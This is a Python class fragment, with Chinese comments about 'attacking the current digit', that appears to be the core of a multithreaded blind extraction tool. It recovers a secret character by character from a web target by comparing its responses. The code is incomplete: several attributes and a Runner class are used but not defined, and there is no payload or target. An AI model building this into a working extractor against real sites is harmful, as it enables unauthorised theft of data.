import requests
import threading
import time

class WebDoc:
    lock=threading.Lock()
    
    #攻击当前的位数
    def __init__(self,url,length,low,high):
        self.url=url 
        self.length=length
        self.low=low
        self.high=high
    def StartAttack(self):
        self.ResetThread(True)
        for i in range(self.maxThread):
            Runner(str(i),self).start()
    
    #获取指定序号的返回结果并存入到resultList[]
    def getResult(self):
        finished=False
        self.lock.acquire()
        self.nowIndex=self.nowIndex+1
        if(self.nowIndex>=len(self.ranges)):
            finished = self.nowCompleteCount>=len(self.ranges)
        else:
            self.getSingleResult(self.nowIndex)
        self.lock.release()
        return finished
    #处理本轮结果
    def ComsumeNowResult(self):
        if(not self.resultList[0].compare(self.resultList[1])):
            if(not self.resultList[1].compare(self.resultList[2])):
                self.nowResult+=self.ranges[1]
            else:
                self.nowResult+=self.ranges[0]
            return self.ResetThread()
        for i in range(0,len(self.resultList)):
            if(not self.resultList[i].compare(self.resultList[0])):
                targetIndex=self.resultList[i].index
  
                #print(f"index:{targetIndex}->{self.ranges[targetIndex]}({len(self.resultList[i].result)})")
                self.nowResult+=self.ranges[targetIndex]
                
                return self.ResetThread()
        print(f"{self.nowResult}:self.nowResult")
    def ResetThread(self,totalReset=False):
        #print(f"self.nowResult:{self.nowResult}")
        self.nowCompleteCount=0
        self.nowIndex=-1
        self.nowLength=1 if totalReset else self.nowLength+1
        self.resultList.clear()